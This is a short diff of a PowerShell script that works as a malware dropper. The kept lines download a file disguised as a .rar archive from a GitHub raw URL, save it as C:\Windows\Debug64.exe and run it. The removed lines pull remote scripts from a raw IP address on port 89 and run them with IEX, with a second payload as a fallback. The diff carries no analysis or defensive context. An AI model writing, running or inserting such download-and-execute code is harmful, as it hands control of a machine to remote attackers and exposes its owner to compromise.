@@ -1,11 +1,2 @@
 (new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Yournamelover/kcptun/master/client/kcp.rar','C:\Windows\Debug64.exe');
 C:\Windows\Debug64.exe
-try{
-sleep 5
-$ProcessName = 'Update_Windows.exe'
-(Get-WmiObject -Query "select * from Win32_Process where name='$ProcessName'").GetOwner().User
-IEX ((new-object net.webclient).downloadstring('http://23.105.207.225:89/ok'))
-}
-catch{
-IEX ((new-object net.webclient).downloadstring('http://23.105.207.225:89/p'))
-}
